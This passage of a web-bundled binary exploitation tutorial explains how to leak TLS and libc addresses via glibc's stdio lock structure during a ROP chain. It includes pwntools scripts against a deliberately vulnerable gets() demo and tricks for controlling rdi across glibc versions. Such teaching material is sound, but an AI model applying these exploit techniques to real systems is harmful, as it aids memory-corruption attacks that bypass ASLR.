structure:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"typedef struct {\n    int lock;\n    int cnt;\n    void *owner;\n} _IO_lock_t;\n"})}),"\n",(0,s.jsxs)(n.p,{children:["And also recall that ",(0,s.jsx)(n.code,{children:"owner"})," gets assigned the address of the ",(0,s.jsx)(n.code,{children:"TLS"})," structure for this thread. While it isn't immediately at the start of the lock, it's not far out of our reach, so what if we were able to pad upto to it, then call ",(0,s.jsx)(n.code,{children:"puts"}),". Since ",(0,s.jsx)(n.code,{children:"TLS"})," (at least for the main thread) is allocated relative to libc, all you'd need is the offset from ",(0,s.jsx)(n.code,{children:"TLS"})," to libc base."]}),"\n",(0,s.jsxs)(n.admonition,{type:"caution",children:[(0,s.jsx)(n.p,{children:"Unfortunately this leak can cause problems depending on the kernel(?), because the TLS can be in different places on different machines, and it doesn't seem to be fixable by using the same docker."}),(0,s.jsx)(n.p,{children:"So keep that in mind when transferring the exploit to remote."}),(0,s.jsx)(n.p,{children:"While I suspect this is due to a kernel difference, if anyone knows exactly why, I'd love to hear it, and I could include it here as well."})]}),"\n",(0,s.jsx)(n.p,{children:"There are initially a few problems with this:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["All input using ",(0,s.jsx)(n.code,{children:"gets"})," is terminated by a null byte"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"owner"})," gets ",(0,s.jsx)(n.code,{children:"NULL"}),"'ed when unlocking if ",(0,s.jsx)(n.code,{children:"--cnt==0"})," (i.e. ",(0,s.jsx)(n.code,{children:"cnt==1"}),")"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"But both of these can be solved with one input:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'p.sendline(b"A" * 4 + b"\\x00"*3)\n'})}),"\n",(0,s.jsxs)(n.p,{children:["The main idea behind this is that we want to set ",(0,s.jsx)(n.code,{children:"cnt=0"}),", so that when it comes to unlocking, it will decrement count ",(0,s.jsx)(n.strong,{children:"first"}),", then check it against ",(0,s.jsx)(n.code,{children:"0"}),", which fails because now ",(0,s.jsx)(n.code,{children:"cnt=0xffffffff"}),", due to an integer underflow. What this does is eliminate the terminating null byte from ",(0,s.jsx)(n.code,{children:"gets"}),", but also since the check fails, ",(0,s.jsx)(n.code,{children:"owner"})," doesn't get ",(0,s.jsx)(n.code,{children:"NULL"}),"'ed, meaning we have uninterrupted padding upto ",(0,s.jsx)(n.code,{children:"owner=TLS"}),", meaning we can then call ",(0,s.jsx)(n.code,{children:"puts"})," and leak ",(0,s.jsx)(n.code,{children:"TLS"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\ne = context.binary = ELF(\'demo\')\nlibc = ELF("libc")\np = e.process()\n\npayload  = b"A" * 0x20\npayload += p64(0)\t# saved rbp\npayload += p64(e.plt.gets)\npayload += p64(e.plt.puts)\n\np.sendlineafter(b"ROP me if you can!\\n", payload)\n\np.sendline(b"A" * 4 + b"\\x00"*3)\n\np.recv(8)\ntls = u64(p.recv(6) + b"\\x00\\x00")\nlog.info(f"tls: {hex(tls)}")\n\nlibc.address = tls + 0x28c0\nlog.info(f"libc: {hex(libc.address)}")\n\np.interactive()\n'})}),"\n",(0,s.jsx)(n.h3,{id:"adjusting-for-2.37",children:"Adjusting for 2.37+"}),"\n",(0,s.jsxs)(n.p,{children:["The above was tested on 2.35, and should work for 2.30-2.36, but 2.37 changed ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L37",children:"_IO_lock_lock"})," and ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L70",children:"_IO_lock_unlock"})," to:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"#define _IO_lock_lock(_name) \\\n  do {\t\t\t\t\t\t\t\t\t      \\\n    void *__self = THREAD_SELF;\t\t\t\t\t\t      \\\n    if (SINGLE_THREAD_P && (_name).owner == NULL)\t\t\t      \\\n      {\t\t\t\t\t\t\t\t\t      \\\n\t(_name).lock = LLL_LOCK_INITIALIZER_LOCKED;\t\t\t      \\\n\t(_name).owner = __self;\t\t\t\t\t\t      \\\n      }\t\t\t\t\t\t\t\t\t      \\\n    else if ((_name).owner != __self)\t\t\t\t\t      \\\n      {\t\t\t\t\t\t\t\t\t      \\\n\tlll_lock ((_name).lock, LLL_PRIVATE);\t\t\t\t      \\\n\t(_name).owner = __self;\t\t\t\t\t\t      \\\n      }\t\t\t\t\t\t\t\t\t      \\\n    else\t\t\t\t\t\t\t\t      \\\n      ++(_name).cnt;\t\t\t\t\t\t\t      \\\n  } while (0)\n\n#define _IO_lock_unlock(_name) \\\n  do {\t\t\t\t\t\t\t\t\t      \\\n    if (SINGLE_THREAD_P && (_name).cnt == 0)\t\t\t\t      \\\n      {\t\t\t\t\t\t\t\t\t      \\\n\t(_name).owner = NULL;\t\t\t\t\t\t      \\\n\t(_name).lock = 0;\t\t\t\t\t\t      \\\n      }\t\t\t\t\t\t\t\t\t      \\\n    else if ((_name).cnt == 0)\t\t\t\t\t\t      \\\n      {\t\t\t\t\t\t\t\t\t      \\\n\t(_name).owner = NULL;\t\t\t\t\t\t      \\\n\tlll_unlock ((_name).lock, LLL_PRIVATE);\t\t\t\t      \\\n      }\t\t\t\t\t\t\t\t\t      \\\n    else\t\t\t\t\t\t\t\t      \\\n      --(_name).cnt;\t\t\t\t\t\t\t      \\\n  } while (0)\n"})}),"\n",(0,s.jsx)(n.p,{children:"Bit more complicated now, but the main takeaways are:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["The inclusion of ",(0,s.jsx)(n.code,{children:"SINGLE_THREAD_P"})]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"cnt"})," is only decremented if ",(0,s.jsx)(n.code,{children:"cnt != 0"})]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["Seems now that ",(0,s.jsx)(n.code,{children:"cnt = 0"})," doesn't necessarily imply that the lock isn't being used, but rather not being used by 2+ instances."]}),"\n",(0,s.jsxs)(n.p,{children:["This forces us to adjust our techniques slightly, especially for leaking libc (the controlling of ",(0,s.jsx)(n.code,{children:"rdi"}),", in its current state anyway hasn't been affected). This is because we can no longer cause an integer underflow to eliminate the terminating null byte, as it refuses to decrement ",(0,s.jsx)(n.code,{children:"cnt=0"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["Fortunately there is a way around this, but it will require an extra call to ",(0,s.jsx)(n.code,{children:"gets"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\ne = context.binary = ELF(\'demo\')\nlibc = ELF("libc")\np = e.process()\n\npayload  = b"A" * 0x20\npayload += p64(0)\t# saved rbp\npayload += p64(e.plt.gets)\npayload += p64(e.plt.gets)\npayload += p64(e.plt.puts)\n\np.sendlineafter(b"ROP me if you can!\\n", payload)\n\np.sendline(p32(0) + b"A"*4 + b"B"*8)\np.sendline(b"CCCC")\n\np.recv(8)\ntls = u64(p.recv(6) + b"\\x00\\x00")\nlog.info(f"tls: {hex(tls)}")\n\nlibc.address = tls + 0x28c0\nlog.info(f"libc: {hex(libc.address)}")\n\np.interactive()\n'})}),"\n",(0,s.jsx)(n.p,{children:"So what's going on here?"}),"\n",(0,s.jsxs)(n.p,{children:["The main aim of the first ",(0,s.jsx)(n.code,{children:"gets"})," is to do the following:"]}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["Set ",(0,s.jsx)(n.code,{children:"lock = 0"}),", which marks the lock as ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/lowlevellock.h#L170",children:"unlocked"}),(0,s.jsx)(n.em,{children:"."})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"/* Initializers for lock.  */\n#define LLL_LOCK_INITIALIZER\t\t(0)\n#define LLL_LOCK_INITIALIZER_LOCKED\t(1)\n"})}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["Fill ",(0,s.jsx)(n.code,{children:"cnt"})," with junk."]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["Clobber ",(0,s.jsx)(n.code,{children:"owner"})," so that ",(0,s.jsx)(n.code,{children:"owner != THREAD_SELF"})]}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["Then on the last call to ",(0,s.jsx)(n.code,{children:"gets"}),", when ",(0,s.jsx)(n.code,{children:"_IO_lock_lock"})," is executed:"]}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"if (SINGLE_THREAD_P && (_name).owner == NULL)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["This check will ",(0,s.jsx)(n.strong,{children:"fail"}),", even if the process is single-threaded, because we set ",(0,s.jsx)(n.code,{children:"owner"})," to junk, so ",(0,s.jsx)(n.code,{children:"owner != NULL"}),". You could do a version where this case passes if you wanted, I decided to make the technique not reliant on it being single-threaded (i.e. more versatile)."]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"else if ((_name).owner != __self)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["This check will ",(0,s.jsx)(n.strong,{children:"succeed"}),"."]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"    lll_lock ((_name).lock, LLL_PRIVATE);\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Unforunately this is unavoidable, but since we set ",(0,s.jsx)(n.code,{children:"lock = 0"}),", this lock is marked as ",(0,s.jsx)(n.strong,{children:"unlocked"}),", so this will just lock it (set ",(0,s.jsx)(n.code,{children:"lock = 1"}),")."]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"    (_name).owner = __self;\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Bingo! The ",(0,s.jsx)(n.code,{children:"owner"})," gets set to the ",(0,s.jsx)(n.code,{children:"TLS"})," structure, which is what we want to leak"]}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["Since ",(0,s.jsx)(n.code,{children:"lock = 1"}),", it contains null bytes which would terminate ",(0,s.jsx)(n.code,{children:"puts"}),", so here we need to fill ",(0,s.jsx)(n.code,{children:"lock"})," with junk (",(0,s.jsx)(n.code,{children:'"CCCC"'}),"). But what about the null byte from ",(0,s.jsx)(n.code,{children:"gets"}),"? Just like before, the ",(0,s.jsx)(n.code,{children:"cnt"})," getting decremented in unlocking will help to eliminate this null byte."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:'p.sendline(b"CCCC")'})," will write a null byte into the ",(0,s.jsx)(n.code,{children:"LSB"})," of ",(0,s.jsx)(n.code,{children:"cnt"}),". In ",(0,s.jsx)(n.code,{children:"_IO_lock_unlock"}),", ",(0,s.jsx)(n.code,{children:"cnt"})," gets decremented as ",(0,s.jsx)(n.code,{children:"cnt != 0"}),", which converts the ",(0,s.jsx)(n.code,{children:"\\x00"})," into ",(0,s.jsx)(n.code,{children:"\\xff"}),", and just like before, the unlocking will leave ",(0,s.jsx)(n.code,{children:"owner"})," alone."]}),"\n",(0,s.jsxs)(n.p,{children:["And just like that, we now have padding upto ",(0,s.jsx)(n.code,{children:"owner=TLS"}),"."]}),"\n",(0,s.jsx)(n.p,{children:"This version of the leak will actually work before 2.37 as well, so this is the more versatile one."}),"\n",(0,s.jsxs)(n.h2,{id:"what-if-rdi-_io_stdfile_0_lock",children:["What if ",(0,s.jsx)(n.code,{children:"rdi != _IO_stdfile_0_lock"}),"?"]}),"\n",(0,s.jsxs)(n.p,{children:["This is all pretty cool (in my opinion at least ",(0,s.jsx)(n.del,{children:"if you disagree you're wrong"}),"), but what if we were presented the following program:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>\n\nint main() {\n\tchar buf[0x20];\n\tputs("ROP me if you can!");\n\tgets(buf);\n\tputs("No lock for you ;)");\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Now we have a problem. While ",(0,s.jsx)(n.code,{children:"gets"})," would place ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"})," into ",(0,s.jsx)(n.code,{children:"rdi"}),", the subequent ",(0,s.jsx)(n.code,{children:"puts"})," call would clobber it. Now what?"]}),"\n",(0,s.jsxs)(n.p,{children:["Ideally we'd want to find a way to put ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"})," into ",(0,s.jsx)(n.code,{children:"rdi"}),", and fortunately there are a few tricks we can use in certain cases:"]}),"\n",(0,s.jsxs)(n.h3,{id:"case-1-rdi-is-writable",children:["Case 1: ",(0,s.jsx)(n.code,{children:"rdi"})," is writable"]}),"\n",(0,s.jsxs)(n.p,{children:["Even if it isn't ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"}),", any writable ",(0,s.jsx)(n.code,{children:"rdi"})," would be a valid condidate for a ",(0,s.jsx)(n.code,{children:"gets"})," call, which would then put ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"})," back into ",(0,s.jsx)(n.code,{children:"rdi"}),"!"]}),"\n",(0,s.jsxs)(n.p,{children:["A common case for this is after some other IO function. Recall that most IO functions follow that locking pattern, which includes ",(0,s.jsx)(n.code,{children:"puts"}),". So in the above example, ",(0,s.jsx)(n.code,{children:"rdi"})," would be ",(0,s.jsx)(n.code,{children:"_IO_stdfile_1_lock"}),", which we can just call ",(0,s.jsx)(n.code,{children:"gets"})," on to get our beloved ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"}),". For dealing with another IO lock, you can use ",(0,s.jsx)(n.code,{children:'p.sendline(b"\\x01")'}),", as the expected value for ",(0,s.jsx)(n.code,{children:"lock"})," will be ",(0,s.jsx)(n.code,{children:"1"})," (",(0,s.jsx)(n.code,{children:"LLL_LOCK_INITIALIZER_LOCKED"}),")."]}),"\n",(0,s.jsxs)(n.h3,{id:"case-2-rdi-is-readable",children:["Case 2: ",(0,s.jsx)(n.code,{children:"rdi"})," is readable"]}),"\n",(0,s.jsxs)(n.p,{children:["While this won't make for a valid candidate for ",(0,s.jsx)(n.code,{children:"gets"}),", it would make a valid candidate for ",(0,s.jsx)(n.code,{children:"puts"}),", so call to ",(0,s.jsx)(n.code,{children:"puts"})," would put into ",(0,s.jsx)(n.code,{children:"Case 1"}),", and so you can then apply the above."]}),"\n",(0,s.jsxs)(n.h3,{id:"case-3-rdi-null",children:["Case 3: ",(0,s.jsx)(n.code,{children:"rdi == NULL"})]}),"\n",(0,s.jsxs)(n.p,{children:["This won't be usable in most IO functions unfortunately. But ",(0,s.jsx)(n.code,{children:"printf"})," isn't just another IO function, it's built ",(0,s.jsx)(n.strong,{children:"different"}),". Let's take a look shall we? Don't worry, we won't go too far ;)"]}),"\n",(0,s.jsx)(n.h4,{id:"printf-scanf",children:"printf/scanf"}),"\n",(0,s.jsxs)(n.p,{children:["Note that ",(0,s.jsx)(n.code,{children:"scanf"})," follows a very similar pattern, and displays the same behaviour as printf in this regard."]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/printf.c#L27",children:"printf"})," is defined as follows:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"int\n__printf (const char *format, ...)\n{\n  va_list arg;\n  int done;\n\n  va_start (arg, format);\n  done = __vfprintf_internal (stdout, format, arg, 0);\n  va_end (arg);\n\n  return done;\n}\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Here we see it calls ",(0,s.jsx)(n.code,{children:"__vfprintf_internal"})," with the first argument (i.e. ",(0,s.jsx)(n.code,{children:"rdi"}),") being ",(0,s.jsx)(n.code,{children:"stdout"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["Then in ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L1179",children:"__vfprintf_internal"})," we see that early on it calls ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L49",children:"ARGCHECK"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"int\nvfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags)\n{\n  ...\n\n  /* Sanity check of arguments.  */\n  ARGCHECK (s, format);\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"#define ARGCHECK(S, Format) \\\n  do\t\t\t\t\t\t\t\t\t      \\\n    {\t\t\t\t\t\t\t\t\t      \\\n      /* Check file argument for consistence.  */\t\t\t      \\\n      CHECK_FILE (S, -1);\t\t\t\t\t\t      \\\n      if (S->_flags & _IO_NO_WRITES)\t\t\t\t\t      \\\n\t{\t\t\t\t\t\t\t\t      \\\n\t  S->_flags |= _IO_ERR_SEEN;\t\t\t\t\t      \\\n\t  __set_errno (EBADF);\t\t\t\t\t\t      \\\n\t  return -1;\t\t\t\t\t\t\t      \\\n\t}\t\t\t\t\t\t\t\t      \\\n      if (Format == NULL)\t\t\t\t\t\t      \\\n\t{\t\t\t\t\t\t\t\t      \\\n\t  __set_errno (EINVAL);\t\t\t\t\t\t      \\\n\t  return -1;\t\t\t\t\t\t\t      \\\n\t}\t\t\t\t\t\t\t\t      \\\n    } while (0)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["The main takeaway from all of this is that ",(0,s.jsx)(n.code,{children:"ARGCHECK"})," forces ",(0,s.jsx)(n.code,{children:"printf"})," to return early if ",(0,s.jsx)(n.code,{children:"format == NULL"}),", meaning it won't ",(0,s.jsx)(n.code,{children:"SEGFAULT"}),". And since ",(0,s.jsx)(n.code,{children:"__vfprintf_internal"})," was called with ",(0,s.jsx)(n.code,{children:"stdout"})," as the first argument, we can guess that it should be preserved until returning. So, is it?"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"#include <stdio.h>\n\nint main() {\n\tprintf(NULL);\n}\n"})}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (117).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("code",{children:"printf(NULL)"})})})]}),"\n",(0,s.jsx)(n.p,{children:"Yes it is! So now we can just use this as a writable address."}),"\n",(0,s.jsxs)(n.p,{children:["There's also a possibility here to use an ",(0,s.jsx)(n.code,{children:"FSOP"})," technique to get a leak. I won't go into detail here, but if you're interested here are some links:"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://0xdf.gitlab.io/2021/01/16/htb-ropetwo.html#leak-libc",children:"https://0xdf.gitlab.io/2021/01/16/htb-ropetwo.html#leak-libc"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html",children:"https://www.willsroot.io/2021/01/rope2-hackthebox-writeup-chromium-v8.html"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://vigneshsrao.github.io/posts/babytcache/",children:"https://vigneshsrao.github.io/posts/babytcache/"})}),"\n"]}),"\n",(0,s.jsx)(n.h4,{id:"fflush",children:"fflush"}),"\n",(0,s.jsxs)(n.p,{children:["Normally ",(0,s.jsx)(n.code,{children:"fflush"})," is called with a single ",(0,s.jsx)(n.code,{children:"FILE"})," to flush its contents:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'printf("Data: ");    // if stdout is buffered, this may not be printed immediately\nfflush(stdout);\n'})}),"\n",(0,s.jsxs)(n.p,{children:["However you can call ",(0,s.jsx)(n.code,{children:"fflush(NULL)"}),", which will go through every ",(0,s.jsx)(n.code,{children:"FILE"})," and flush all of them."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (31).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iofflush.c#L31",children:"fflush"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["It does by calling ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L724",children:"_IO_flush_all"}),"."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (30).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L714",children:"_IO_flush_all_lockp"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["Then at the end of ",(0,s.jsx)(n.code,{children:"_IO_flush_all(_lockp)"}),", it first unlocks ",(0,s.jsx)(n.code,{children:"list_all_lock"}),", which is used to lock the list of all ",(0,s.jsx)(n.code,{children:"FILE"}),"'s. While this would put a lock into ",(0,s.jsx)(n.code,{children:"rdi"}),", that's not what reaches the end."]}),"\n",(0,s.jsxs)(n.p,{children:["It then calls ",(0,s.jsx)(n.code,{children:"_IO_cleanup_region_end(0)"}),", which is effectively just:"]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (32).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/libc-lock.h#L174",children:"_IO_cleanup_region_end"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["This then goes onto call ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/nptl/libc-cleanup.c#L38",children:"__libc_cleanup_pop_restore"})," with a first argument of ",(0,s.jsx)(n.code,{children:"&_buffer"}),", which is preserved until returning. ",(0,s.jsx)(n.code,{children:"_buffer"})," is a cleanup buffer, which is stored on the stack, so a stack pointer is returned in ",(0,s.jsx)(n.code,{children:"rdi"}),"! For more information, see ",(0,s.jsx)(n.a,{href:"../../ctf-writeups/htb-business-2024/no-gadgets#fun-with-fun-lockfile",children:"here"}),"."]}),"\n",(0,s.jsxs)(n.h3,{id:"case-4-rdi-is-junk",children:["Case 4: ",(0,s.jsx)(n.code,{children:"rdi"})," is junk"]}),"\n",(0,s.jsx)(n.h4,{id:"rand",children:"rand"}),"\n",(0,s.jsxs)(n.p,{children:["There's actually a non-IO function that can be used here: ",(0,s.jsx)(n.code,{children:"rand"}),", which returns a pointer to ",(0,s.jsx)(n.code,{children:"unsafe_state"})," in ",(0,s.jsx)(n.code,{children:"rdi"})," across a broad range of libc versions. More details on this can be found ",(0,s.jsx)(n.a,{href:"../fork_gadget#ret2rand",children:"here"}),"."]}),"\n",(0,s.jsx)(n.h4,{id:"getchar-putchar",children:"getchar/putchar"}),"\n",(0,s.jsxs)(n.p,{children:["In theory, these functions would be perfect. The argument wouldn't matter, and as IO functions ",(0,s.jsx)(n.em,{children:"usually"})," unlock at the very end, they would place a lock into ",(0,s.jsx)(n.code,{children:"rdi"})," (",(0,s.jsx)(n.code,{children:"getchar"})," would give you ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock_"}),"). Unfortunately, there's an optimization in the way: ",(0,s.jsx)(n.code,{children:"_IO_need_lock"}),"."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (34).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/getchar.c#L33",children:"getchar"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["So if the ",(0,s.jsx)(n.code,{children:"FILE"})," is determined to not need a lock, then it doesn't use one?"]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (35).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L212",children:"_IO_need_lock"})})})]}),"\n",(0,s.jsx)(n.p,{children:"It turns out that for some simpler IO functions, the locking can be optimized away in the single-threaded case:"}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (36).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsxs)("p",{children:["Where ",(0,s.jsx)("code",{children:"_IO_need_lock"})," is used."]})})]}),"\n",(0,s.jsxs)(n.p,{children:["And when a thread is made, ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L517",children:"_IO_enable_locks"})," is called, which ensures all new and old ",(0,s.jsx)(n.code,{children:"FILE"}),"'s have the ",(0,s.jsx)(n.code,{children:"_IO_FLAGS2_NEED_LOCK"})," flag set."]}),"\n",(0,s.jsxs)(n.p,{children:["So, when the application is multithreaded, ",(0,s.jsx)(n.code,{children:"getchar"}),"/",(0,s.jsx)(n.code,{children:"putchar"})," would use locking, otherwise it would just follow the behaviour of ",(0,s.jsx)(n.code,{children:"_IO_(getc|putc)_unlocked"}),"."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (37).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L102",children:"_IO_getc_unlocked"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["Since this is a macro, the ",(0,s.jsx)(n.code,{children:"fp"})," wouldn't be loaded into ",(0,s.jsx)(n.code,{children:"rdi"}),", so the only chance you really have is if ",(0,s.jsx)(n.code,{children:"__uflow"})," for example did something useful. In ",(0,s.jsx)(n.code,{children:"getchar"}),", if ",(0,s.jsx)(n.code,{children:"stdin"})," is unbuffered (or buffer is empty), it will call ",(0,s.jsx)(n.code,{children:"read(0, ...)"}),", which leaves ",(0,s.jsx)(n.code,{children:"rdi=0"}),", and maybe you can then use the ",(0,s.jsx)(n.code,{children:"rdi=NULL"})," case functions."]}),"\n",(0,s.jsx)(n.p,{children:"These are just a few functions which can help, there could be many more that I'm not aware of. Most of these are just some common ones which have one thing in common: they're IO functions."}),"\n",(0,s.jsx)(n.p,{children:"If anyone has any other tricks for this, I'd be interested to know, and maybe I'll update this to include them, with credit of course :)"})]})}function a(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},1794:(e,n,t)=>{t.d(n,{A:()=>i});const i=t.p+"assets/files/demo-8d1f43bf5dc851d7d9ba52136a43c8c0.zip"},2242:(e,n,t)=>{t.d(n,{A:()=>i});const i=t.p+"assets/images/image (122)-5bcf327587c4d249c5951e18434292cc.png"},8453:(e,n,t)=>{t.d(n,{R:()=>c,x:()=>o});var i=t(6540);const s={},l=i.createContext(s);function c(e){const n=i.useContext(l);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:c(e.components),i.createElement(l.Provider,{value:n},e.children)}}}]);